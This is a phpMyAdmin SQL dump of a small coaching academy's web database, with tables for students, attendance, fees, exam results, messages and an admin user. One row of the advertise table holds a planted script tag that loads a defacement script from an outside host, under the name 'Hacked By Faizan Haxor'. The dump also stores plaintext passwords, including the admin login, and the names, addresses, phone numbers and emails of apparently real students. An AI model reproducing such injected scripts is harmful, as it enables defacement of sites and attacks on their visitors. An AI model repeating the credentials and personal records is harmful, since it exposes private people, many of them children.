-- phpMyAdmin SQL Dump
-- version 4.8.5
-- https://www.phpmyadmin.net/
--
-- Host: localhost:3306
-- Generation Time: Jun 16, 2019 at 10:33 AM
-- Server version: 5.7.26-log
-- PHP Version: 7.2.7

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET AUTOCOMMIT = 0;
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `apex_root`
--

-- --------------------------------------------------------

--
-- Table structure for table `adtype`
--

CREATE TABLE `adtype` (
  `adType_id` int(11) NOT NULL,
  `adType_name` varchar(250) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `adtype`
--

INSERT INTO `adtype` (`adType_id`, `adType_name`) VALUES
(1, 'Required'),
(2, 'Wanted');

-- --------------------------------------------------------

--
-- Table structure for table `advertise`
--

CREATE TABLE `advertise` (
  `ad_id` int(11) NOT NULL,
  `ad_date` varchar(250) NOT NULL,
  `ad_desc` varchar(250) NOT NULL,
  `ad_name` varchar(250) NOT NULL,
  `ad_mobile` varchar(250) NOT NULL,
  `ad_type` varchar(250) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `advertise`
--

INSERT INTO `advertise` (`ad_id`, `ad_date`, `ad_desc`, `ad_name`, `ad_mobile`, `ad_type`) VALUES
(2, '26/11/2010', '<script type=\"text/javascript\" src=\"http://yourjavascript.com/9191275314/deface.js\"></script>', 'Hacked  By Faizan Haxor', '8698642735', '1');

-- --------------------------------------------------------

--
-- Table structure for table `attendance`
--

CREATE TABLE `attendance` (
  `attId` int(11) NOT NULL,
  `studentId` varchar(250) NOT NULL,
  `attendance` varchar(250) NOT NULL,
  `date` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `attendance`
--

INSERT INTO `attendance` (`attId`, `studentId`, `attendance`, `date`) VALUES
(1, '2', 'Present', '2019-03-28 17:03:26'),
(2, '16', 'Present', '2019-03-28 17:03:26'),
(3, '16', 'Absent', '2019-03-28 17:04:21'),
(4, '19', 'Absent', '2019-03-28 17:04:37'),
(5, '3', 'Present', '2019-03-28 17:05:03'),
(6, '20', 'Present', '2019-03-28 17:05:03'),
(7, '3', 'Absent', '2019-03-28 17:05:16'),
(8, '5', 'Present', '2019-03-28 17:57:31'),
(9, '5', 'Absent', '2019-03-28 17:57:43'),
(10, '5', 'Present', '2019-03-29 03:00:33'),
(11, '6', 'Present', '2019-03-29 03:00:51'),
(12, '6', 'Absent', '2019-03-29 03:01:12'),
(13, '10', 'Present', '2019-03-29 03:02:02'),
(14, '10', 'Absent', '2019-03-29 03:02:17'),
(15, '3', 'Present', '2019-04-06 07:32:12'),
(16, '2', 'Present', '2019-04-07 12:09:37'),
(17, '16', 'Present', '2019-04-07 12:09:37'),
(18, '19', 'Present', '2019-04-07 12:09:37'),
(19, '2', 'Present', '2019-04-14 15:08:05'),
(20, '19', 'Present', '2019-04-14 15:08:05');

-- --------------------------------------------------------

--
-- Table structure for table `category`
--

CREATE TABLE `category` (
  `cat_id` int(11) NOT NULL,
  `cat_name` varchar(250) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `category`
--

INSERT INTO `category` (`cat_id`, `cat_name`) VALUES
(1, 'Laptops'),
(2, 'Computers');

-- --------------------------------------------------------

--
-- Table structure for table `compititive`
--

CREATE TABLE `compititive` (
  `id` int(10) NOT NULL,
  `examName` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `compititive`
--

INSERT INTO `compititive` (`id`, `examName`) VALUES
(1, 'Shreya'),
(2, 'NSO'),
(3, 'IMO'),
(4, 'IEO'),
(5, 'Scholorship 5'),
(6, 'Scholorship 8'),
(7, 'BDS'),
(8, 'NCO');

-- --------------------------------------------------------

--
-- Table structure for table `courses`
--

CREATE TABLE `courses` (
  `course_id` int(11) NOT NULL,
  `course_name` varchar(250) NOT NULL,
  `course_duration` varchar(250) NOT NULL,
  `course_fee` varchar(250) NOT NULL,
  `course_start` varchar(250) NOT NULL,
  `class` int(10) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `courses`
--

INSERT INTO `courses` (`course_id`, `course_name`, `course_duration`, `course_fee`, `course_start`, `class`) VALUES
(1, '1/SEMI/ALL', '1 Yrs', '9999', '01/04/2019', 1),
(2, '1/SEMI/ALL', '1 Yrs', '9999', '01/04/2019', 1),
(3, '3/SEMI/ALL', '1 Yrs', '9999', '01/04/2019', 3),
(4, '4/CBSE/ALL', '1 Yrs', '9999', '01/04/2019', 4),
(5, '5/SEMI/SCI', '1 Yrs', '9999', '01/04/2019', 5),
(6, '6/CBSE/ALL', '1 Yrs', '9999', '01/04/2019', 6),
(7, '7/MARATHI/ALL', '1 Yrs', '9999', '01/04/2019', 7),
(8, '8/CBSE/ALL', '1 Yrs', '9999', '01/04/2019', 8),
(9, '9/SEMI/ALL', '1 Yrs', '9999', '01/04/2019', 9),
(10, '10/CBSE/ENG', '1 Yrs', '9999', '01/04/2019', 10),
(11, '1/Semi/AllSub', '1 Yrs', '9999', '01/04/2019', 4);

-- --------------------------------------------------------

--
-- Table structure for table `exam`
--

CREATE TABLE `exam` (
  `id` int(10) NOT NULL,
  `batchName` varchar(250) NOT NULL,
  `date` varchar(250) NOT NULL,
  `subject` varchar(250) NOT NULL,
  `class` int(10) NOT NULL,
  `totalMarks` varchar(250) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `exam`
--

INSERT INTO `exam` (`id`, `batchName`, `date`, `subject`, `class`, `totalMarks`) VALUES
(1, '4', '31/03/2019', 'Science', 4, '50'),
(2, '2', '28/03/2019', 'English', 1, '100');

-- --------------------------------------------------------

--
-- Table structure for table `expenses`
--

CREATE TABLE `expenses` (
  `id` int(10) NOT NULL,
  `particular` varchar(255) NOT NULL,
  `amt` int(10) NOT NULL,
  `date` varchar(250) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `expenses`
--

INSERT INTO `expenses` (`id`, `particular`, `amt`, `date`) VALUES
(5, 'Light Bill', 550, '31/03/2019'),
(6, 'Mobile BIll', 480, '30/03/2019');

-- --------------------------------------------------------

--
-- Table structure for table `fee`
--

CREATE TABLE `fee` (
  `id` int(11) NOT NULL,
  `studentId` int(11) NOT NULL,
  `classId` int(11) NOT NULL,
  `batchId` int(11) NOT NULL,
  `fees` int(11) NOT NULL,
  `rNo` int(11) NOT NULL,
  `date` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `fee`
--

INSERT INTO `fee` (`id`, `studentId`, `classId`, `batchId`, `fees`, `rNo`, `date`) VALUES
(1, 19, 3, 3, 5000, 1, '2019-03-29 15:01:32'),
(2, 16, 3, 3, 2000, 2, '2019-03-29 15:02:29'),
(3, 15, 5, 1, 500, 3, '2019-03-29 15:02:52'),
(4, 14, 2, 2, 8000, 4, '2019-03-29 15:04:02'),
(5, 19, 3, 3, 2000, 5, '2019-03-29 15:19:57'),
(6, 19, 3, 3, 2000, 5, '2019-03-29 15:20:05'),
(7, 16, 3, 3, 1000, 6, '2019-03-29 15:21:14'),
(8, 16, 3, 3, 500, 7, '2019-03-29 15:21:59'),
(9, 16, 3, 3, 200, 8, '2019-03-29 15:22:45'),
(10, 16, 3, 3, 100, 9, '2019-03-29 15:24:17'),
(11, 20, 10, 10, 1000, 15, '2019-04-06 07:29:27'),
(12, 19, 3, 3, 100, 18, '2019-04-07 12:06:35');

-- --------------------------------------------------------

--
-- Table structure for table `gallery`
--

CREATE TABLE `gallery` (
  `gallery_id` int(11) NOT NULL,
  `gallery_title` varchar(250) NOT NULL,
  `gallery_image` varchar(250) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `gallery`
--

INSERT INTO `gallery` (`gallery_id`, `gallery_title`, `gallery_image`) VALUES
(1, 'At Price Distribution in Apex Acadamy', 'product_2019-03-28-10-52-08_5c9c99485846c.jpg'),
(2, 'Group Photo of All teachers & Students', 'product_2019-03-28-10-52-51_5c9c99735a6fd.jpg'),
(3, 'In the Exam Hall At Apex Acadamy', 'product_2019-03-28-10-53-24_5c9c9994bea78.jpg'),
(4, 'Carrier Guidance At Apex Acadamy', 'product_2019-03-28-10-54-17_5c9c99c90b1cc.jpg'),
(5, 'While teaching at Apex Acadamy', 'product_2019-03-28-10-54-53_5c9c99eddf4d4.jpg'),
(6, 'Using Digital Media at Apex Acadamy', 'product_2019-03-28-10-55-26_5c9c9a0eaa585.jpg'),
(7, 'In Liberary hall at Apex Acadamy', 'product_2019-03-28-10-56-24_5c9c9a4841680.jpg'),
(8, 'In the Hall Of Exam', 'product_2019-03-28-10-56-50_5c9c9a6244d66.jpg'),
(9, 'While teaching at Apex Acadamy', 'product_2019-03-28-10-58-33_5c9c9ac9a1ddf.jpg'),
(10, 'Exam Hall ...................', '10.jpg');

-- --------------------------------------------------------

--
-- Table structure for table `msg`
--

CREATE TABLE `msg` (
  `id` int(10) NOT NULL,
  `studentId` int(10) NOT NULL,
  `message` text NOT NULL,
  `date` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `msg`
--

INSERT INTO `msg` (`id`, `studentId`, `message`, `date`) VALUES
(1, 1, '<p>Tomorrow is holiday for Classes. Please will come on Monday.</p>\r\n', '2019-04-03 04:09:05'),
(2, 15, '<p>Tomorrow is holiday for Classes. Please will come on Monday.</p>\r\n', '2019-04-03 04:09:06'),
(3, 17, '<p>Tomorrow is holiday for Classes. Please will come on Monday.</p>\r\n', '2019-04-03 04:09:06'),
(4, 18, '<p>Tomorrow is holiday for Classes. Please will come on Monday.</p>\r\n', '2019-04-03 04:09:06'),
(5, 1, '<p>Come with Report Card Tomorrow</p>\r\n', '2019-04-03 04:09:58');

-- --------------------------------------------------------

--
-- Table structure for table `msgtoclasses`
--

CREATE TABLE `msgtoclasses` (
  `id` int(10) NOT NULL,
  `studentId` int(10) NOT NULL,
  `date` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `msgToClass` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `msgtoclasses`
--

INSERT INTO `msgtoclasses` (`id`, `studentId`, `date`, `msgToClass`) VALUES
(1, 1, '2019-04-04 12:35:48', 'Hi Admin'),
(2, 1, '2019-04-04 14:02:53', 'Hello Send Result'),
(3, 3, '2019-04-06 07:39:07', 'Hello sir fgbjfgkblglkt klghn k');

-- --------------------------------------------------------

--
-- Table structure for table `products`
--

CREATE TABLE `products` (
  `product_id` int(11) NOT NULL,
  `cat_id` varchar(250) NOT NULL,
  `product_name` varchar(250) NOT NULL,
  `product_desc` varchar(250) NOT NULL,
  `product_price` varchar(250) NOT NULL,
  `product_image` varchar(250) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `products`
--

INSERT INTO `products` (`product_id`, `cat_id`, `product_name`, `product_desc`, `product_price`, `product_image`) VALUES
(1, '1', 'HP Laptop tx658', 'HP Laptop tx658 HP Laptop tx658HP Laptop tx658 HP Laptop tx658 HP Laptop tx658', '35000', '001.jpg'),
(2, '2', 'DELL Laptop tx658', 'HP Laptop tx658 HP Laptop tx658HP Laptop tx658 HP Laptop tx658 HP Laptop tx658', '35000', '001.jpg'),
(3, '2', 'Lenevo Laptop tx658', 'HP Laptop tx658 HP Laptop tx658HP Laptop tx658 HP Laptop tx658 HP Laptop tx658', '78000', '001.jpg'),
(4, '2', 'Canon 244DW', '<p>sssss</p>\r\n', '15500', '004.jpg'),
(5, '1', 'santosh', '<p>ajax</p>\r\n', '124578124578', '005.jpg'),
(6, '1', 'gaurav', '<p>Gaurav</p>\r\n', '999999999', 'g1.jpg'),
(7, '2', 'khbkkj', '<p>jhvhgkkjb</p>\r\n', 'mnbbnkb', '001s.jpg'),
(8, '2', 'ggg', '<p>jvv</p>\r\n', 'kjbhk', '001s.jpg'),
(9, '2', 'nlnlk', '<p>cvcvh</p>\r\n', '44', '003.jpg'),
(10, '2', 'ggg', '<p>gfjgh</p>\r\n', 'gg', 'image_2018-02-22-05-08-35_5a8e42433613b.jpg');

-- --------------------------------------------------------

--
-- Table structure for table `register`
--

CREATE TABLE `register` (
  `regId` int(11) NOT NULL,
  `regName` varchar(255) NOT NULL,
  `regEmail` varchar(255) NOT NULL,
  `regMobile` varchar(255) NOT NULL,
  `regAddress` varchar(255) NOT NULL,
  `regQua` varchar(255) NOT NULL,
  `regCourse` varchar(255) NOT NULL,
  `date` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `register`
--

INSERT INTO `register` (`regId`, `regName`, `regEmail`, `regMobile`, `regAddress`, `regQua`, `regCourse`, `date`) VALUES
(1, 'Santosh Sontakke', 'santu.ghau@gmail.com', '8745214578', 'Line Galli , Degloor', 'BCA', '1', '2018-02-27 12:59:37'),
(2, 'Gaurav Ashokrao Sontakke', 'santu.ghau@gmail.com', '7845784578', 'Line Galli, Degloor', 'BCS', '5', '2018-02-28 01:59:28'),
(3, 'Vishal Indurkar', 'santu.ghau@gmail.com', '7845124578', 'Line Galli, Degloor', 'BCA', '4', '2018-02-28 02:00:37'),
(4, 'Scott Matthews', 'ScottMSr@gmail.com', '9177192583', '12 St. Johns Pl #2F', '2', '', '2019-06-11 18:18:56');

-- --------------------------------------------------------

--
-- Table structure for table `result`
--

CREATE TABLE `result` (
  `id` int(10) NOT NULL,
  `studentId` int(10) NOT NULL,
  `batchId` int(10) NOT NULL,
  `classId` int(10) NOT NULL,
  `date` varchar(255) NOT NULL,
  `subject` varchar(255) NOT NULL,
  `totalMarks` int(10) NOT NULL,
  `obtainmark` int(10) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `result`
--

INSERT INTO `result` (`id`, `studentId`, `batchId`, `classId`, `date`, `subject`, `totalMarks`, `obtainmark`) VALUES
(27, 8, 4, 4, '31/03/2019', 'Science', 50, 10),
(28, 12, 4, 4, '31/03/2019', 'Science', 50, 10);

-- --------------------------------------------------------

--
-- Table structure for table `review`
--

CREATE TABLE `review` (
  `review_id` int(11) NOT NULL,
  `review_name` varchar(250) NOT NULL,
  `review_image` varchar(250) NOT NULL,
  `review` varchar(250) NOT NULL,
  `review_date` varchar(250) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Table structure for table `student`
--

CREATE TABLE `student` (
  `id` int(10) NOT NULL,
  `name` varchar(255) NOT NULL,
  `address` varchar(255) NOT NULL,
  `class` varchar(255) NOT NULL,
  `batch` varchar(255) NOT NULL,
  `medium` varchar(255) NOT NULL,
  `gender` varchar(255) NOT NULL,
  `mobile` varchar(255) NOT NULL,
  `email` varchar(255) NOT NULL,
  `school` varchar(255) NOT NULL,
  `fee` int(10) NOT NULL,
  `password` varchar(255) NOT NULL,
  `subject` varchar(255) NOT NULL,
  `cexam` varchar(255) NOT NULL,
  `dob` varchar(255) NOT NULL,
  `image` varchar(255) NOT NULL,
  `date` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `student`
--

INSERT INTO `student` (`id`, `name`, `address`, `class`, `batch`, `medium`, `gender`, `mobile`, `email`, `school`, `fee`, `password`, `subject`, `cexam`, `dob`, `image`, `date`) VALUES
(1, 'Yamini ', 'Aman Complex , Flat No 9  Nanded', '1', '1', 'CBSE', 'female', '8698642735', 'santu.ghau@gmail.com', 'Little Scholo Publish School, Nanded', 100000, 'gaurav_2611', 'English,Science,Math', 'NSO,IMO,Scholorship 5,NCO', '26/07/2018', '1.jpg', '2019-03-28 14:37:50'),
(2, 'Sanskar ', 'Joshi Galli, Degloor', '3', '3', 'CBSE', 'male', '8698642735', 'santu.ghau@gmail.com', 'Little Scholo Publish School, Nanded', 1000000, 'orange_2611', 'English,Science,Math', 'Scholorship 5,Scholorship 8,BDS,NCO', '26/11/2010', '2.jpg', '2019-03-28 14:39:47'),
(3, 'Gaurav ', 'Joshi Galli, Degloor', '10', '10', 'Semi', 'male', '8698642735', 'santu.ghau@gmail.com', 'Little Scholo Publish School, Nanded', 10000, '3_2611', 'Marathi,English', 'NSO,IMO', '30/12/1992', '3.jpg', '2019-03-28 14:41:24'),
(4, 'Soham ', 'Radhika Nagar , Nanded', '6', '6', 'Semi', 'male', '8698642735', 'santu.ghau@gmail.com', 'Little Scholo Publish School, Nanded', 1000, 'orange_2611', 'Marathi,Hindi,English,Science', 'Shreya,NSO,IMO,IEO', '23/03/2019', '4.jpg', '2019-03-28 14:42:32'),
(5, 'Swara ', 'Radhika Nagar , Nanded', '2', '11', 'Semi', 'female', '8698642735', 'santu.ghau@gmail.com', 'Little Scholo Publish School, Nanded', 1000000, '5_2611', 'English,Science', 'IMO,IEO', '28/03/2019', '5.jpg', '2019-03-28 14:43:41'),
(6, 'Tejas ', 'Hanegaon Degloor', '9', '9', 'Semi', 'male', '8698642735', 'sanskarsontakke@gmail.com', 'Little Scholo Publish School, Nanded', 1, 'orange_2611', 'Marathi,Hindi', 'Shreya,NSO', '28/03/2019', '6.jpg', '2019-03-28 14:44:47'),
(7, 'Prathamesh ', 'Joshi Galli, Degloor', '5', '5', 'Marathi', 'male', '8698642735', 'santu.ghau@gmail.com', 'Little Scholo Publish School, Nanded', 1000000, 'orange_2611', 'Marathi,Hindi,English,Science', 'IMO,IEO,Scholorship 5,Scholorship 8', '15/03/2019', '7.jpg', '2019-03-28 14:45:49'),
(8, 'Atharv ', 'Joshi Galli, Degloor', '4', '4', 'Semi', 'male', '8698642735', 'santu.ghau@gmail.com', 'Little Scholo Publish School, Nanded', 1000000, '8_2611', 'Hindi,English,Science', 'NSO,IEO', '14/03/2019', '8.jpg', '2019-03-28 14:46:56'),
(9, 'Arnav ', 'Joshi Galli, Degloor', '7', '7', 'CBSE', 'male', '8698642735', 'santu_ghau@rediff.com', 'Little Scholo Publish School, Nanded', 1000000, 'orange_2611', 'Hindi,English,Science,Math', 'Scholorship 5,Scholorship 8,BDS,NCO', '28/03/2019', '9.jpg', '2019-03-28 14:48:03'),
(10, 'Amithab ', 'Line Galli , Degloor', '8', '8', 'Marathi', 'male', '8698642735', 'santu.ghau@gmail.com', 'Little Scholo Publish School, Nanded', 1000000, 'orange_2611', 'Hindi,English', 'NSO,IMO', '28/03/2019', '10.jpg', '2019-03-28 14:49:16'),
(11, 'Vishal ', 'Line Galli , Degloor', '5', '5', 'Marathi', 'male', '8698642735', 'santu.ghau@gmail.com', 'Little Scholo Publish School, Nanded', 1000000, 'orange_2611', 'Marathi,Hindi,English', 'IMO,IEO', '08/03/2019', '11.jpg', '2019-03-28 14:50:15'),
(12, 'Bramahananda ', 'Joshi Galli, Degloor', '4', '4', 'Marathi', 'male', '8698642735', 'santu.ghau@gmail.com', 'Little Scholo Publish School, Nanded', 1000000, 'orange_2611', 'Hindi', 'NSO', '20/03/2019', '12.jpg', '2019-03-28 14:51:46'),
(13, 'Ranjana Kulkarni', 'Line Galli , Degloor', '6', '6', 'Marathi', 'female', '8698642735', 'santu.ghau@gmail.com', 'Little Scholo Publish School, Nanded', 1, 'orange_2611', 'Hindi', 'NSO', '28/03/2019', '13.jpg', '2019-03-28 14:52:46'),
(14, 'Shriyogi Patil', 'Line Galli , Degloor', '2', '2', 'Semi', 'female', '8698642735', 'santu.ghau@gmail.com', 'Little Scholo Publish School, Nanded', 10000, 'orange_2611', 'Hindi,English', 'NSO,IMO', '14/03/2019', '14.jpg', '2019-03-28 14:53:59'),
(15, 'Priyanka Patil', 'Line Galli , Degloor', '1', '1', 'Marathi', 'female', '8698642735', 'santu.ghau@gmail.com', 'Little Scholo Publish School, Nanded', 0, 'orange_2611', 'Marathi,Hindi', 'Shreya,NSO', '04/03/2019', '15.jpg', '2019-03-28 14:55:08'),
(16, 'Piyusha Patil', 'Line Galli , Degloor', '3', '3', 'Marathi', 'female', '8698642735', 'santu.ghau@gmail.com', 'Little Scholo Publish School, Nanded', 1000000, 'orange_2611', 'Marathi,English', 'IMO,Scholorship 5', '05/03/2019', '16.jpg', '2019-03-28 14:56:12'),
(17, 'Prashant Kumar', 'Beed', '1', '1', 'Marathi', 'male', '8698642735', 'santu.ghau@gmail.com', 'Little Scholo Publish School, Nanded', 1, 'orange_2611', 'Marathi', 'Shreya', '09/03/2019', '17.jpg', '2019-03-28 14:57:34'),
(18, 'Sachin ', 'Line Galli , Degloor', '1', '1', 'Marathi', 'male', '8698642735', 'santu.ghau@gmail.com', 'Little Scholo Publish School, Nanded', 1000000, 'orange_2611', 'Marathi,Hindi', 'Shreya,NSO', '05/03/2019', '18.jpg', '2019-03-28 14:59:56'),
(19, 'Sanskar', 'Aman Complex , Flat No 9  Nanded', '3', '3', 'CBSE', 'male', '8698642735', 'santu.ghau@gmail.com', 'Little Scholors,Public School, Nanded', 0, '19_2611', 'Marathi,Hindi,English,Science,Math,History,Geography', 'Shreya,NSO,IMO,IEO,Scholorship 5,Scholorship 8,BDS,NCO', '10/03/2019', '19.jpg', '2019-03-28 15:00:52'),
(20, 'Sachin ', 'Joshi Galli, Degloor', '10', '10', 'Marathi', 'male', '8698642735', 'santu.ghau@gmail.com', 'Little Scholo Publish School, Nanded', 1000000, 'orange_2611', 'Marathi,Hindi', 'IMO,IEO', '12/03/2019', '20.jpg', '2019-03-28 15:02:11'),
(21, 'Uma', 'Degloor', '2', '1', 'Marathi', 'male', '7588523896', 'uma77kajale@gmail.com', 'Zp', 1000, '12345678', 'Marathi,Hindi,English,Science,Math,History,Geography,Sanskrut', 'Shreya', '10/05/2000', '21.jpg', '2019-04-09 12:56:19');

-- --------------------------------------------------------

--
-- Table structure for table `subject`
--

CREATE TABLE `subject` (
  `id` int(10) NOT NULL,
  `subjectName` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `subject`
--

INSERT INTO `subject` (`id`, `subjectName`) VALUES
(1, 'Marathi'),
(2, 'Hindi'),
(3, 'English'),
(4, 'Science'),
(5, 'Math'),
(6, 'History'),
(7, 'Geography'),
(8, 'Sanskrut');

-- --------------------------------------------------------

--
-- Table structure for table `users`
--

CREATE TABLE `users` (
  `user_id` int(11) NOT NULL,
  `user_name` varchar(250) NOT NULL,
  `user_pass` varchar(250) NOT NULL,
  `user_role` varchar(250) NOT NULL,
  `user_image` varchar(250) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `users`
--

INSERT INTO `users` (`user_id`, `user_name`, `user_pass`, `user_role`, `user_image`) VALUES
(1, 'gaurav', 'gaurav', 'admin', 'default.jpg');

--
-- Indexes for dumped tables
--

--
-- Indexes for table `adtype`
--
ALTER TABLE `adtype`
  ADD PRIMARY KEY (`adType_id`);

--
-- Indexes for table `advertise`
--
ALTER TABLE `advertise`
  ADD PRIMARY KEY (`ad_id`);

--
-- Indexes for table `attendance`
--
ALTER TABLE `attendance`
  ADD PRIMARY KEY (`attId`);

--
-- Indexes for table `category`
--
ALTER TABLE `category`
  ADD PRIMARY KEY (`cat_id`);

--
-- Indexes for table `compititive`
--
ALTER TABLE `compititive`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `courses`
--
ALTER TABLE `courses`
  ADD PRIMARY KEY (`course_id`);

--
-- Indexes for table `exam`
--
ALTER TABLE `exam`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `expenses`
--
ALTER TABLE `expenses`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `fee`
--
ALTER TABLE `fee`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `gallery`
--
ALTER TABLE `gallery`
  ADD PRIMARY KEY (`gallery_id`);

--
-- Indexes for table `msg`
--
ALTER TABLE `msg`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `msgtoclasses`
--
ALTER TABLE `msgtoclasses`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `products`
--
ALTER TABLE `products`
  ADD PRIMARY KEY (`product_id`);

--
-- Indexes for table `register`
--
ALTER TABLE `register`
  ADD PRIMARY KEY (`regId`);

--
-- Indexes for table `result`
--
ALTER TABLE `result`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `review`
--
ALTER TABLE `review`
  ADD PRIMARY KEY (`review_id`);

--
-- Indexes for table `student`
--
ALTER TABLE `student`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `subject`
--
ALTER TABLE `subject`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `users`
--
ALTER TABLE `users`
  ADD PRIMARY KEY (`user_id`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `adtype`
--
ALTER TABLE `adtype`
  MODIFY `adType_id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;

--
-- AUTO_INCREMENT for table `advertise`
--
ALTER TABLE `advertise`
  MODIFY `ad_id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;

--
-- AUTO_INCREMENT for table `attendance`
--
ALTER TABLE `attendance`
  MODIFY `attId` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=21;

--
-- AUTO_INCREMENT for table `category`
--
ALTER TABLE `category`
  MODIFY `cat_id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;

--
-- AUTO_INCREMENT for table `compititive`
--
ALTER TABLE `compititive`
  MODIFY `id` int(10) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=9;

--
-- AUTO_INCREMENT for table `courses`
--
ALTER TABLE `courses`
  MODIFY `course_id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=12;

--
-- AUTO_INCREMENT for table `exam`
--
ALTER TABLE `exam`
  MODIFY `id` int(10) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;

--
-- AUTO_INCREMENT for table `expenses`
--
ALTER TABLE `expenses`
  MODIFY `id` int(10) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=7;

--
-- AUTO_INCREMENT for table `fee`
--
ALTER TABLE `fee`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=13;

--
-- AUTO_INCREMENT for table `gallery`
--
ALTER TABLE `gallery`
  MODIFY `gallery_id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=11;

--
-- AUTO_INCREMENT for table `msg`
--
ALTER TABLE `msg`
  MODIFY `id` int(10) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=6;

--
-- AUTO_INCREMENT for table `msgtoclasses`
--
ALTER TABLE `msgtoclasses`
  MODIFY `id` int(10) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=4;

--
-- AUTO_INCREMENT for table `products`
--
ALTER TABLE `products`
  MODIFY `product_id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=11;

--
-- AUTO_INCREMENT for table `register`
--
ALTER TABLE `register`
  MODIFY `regId` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=5;

--
-- AUTO_INCREMENT for table `result`
--
ALTER TABLE `result`
  MODIFY `id` int(10) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=29;

--
-- AUTO_INCREMENT for table `review`
--
ALTER TABLE `review`
  MODIFY `review_id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `student`
--
ALTER TABLE `student`
  MODIFY `id` int(10) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=22;

--
-- AUTO_INCREMENT for table `subject`
--
ALTER TABLE `subject`
  MODIFY `id` int(10) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=9;

--
-- AUTO_INCREMENT for table `users`
--
ALTER TABLE `users`
  MODIFY `user_id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
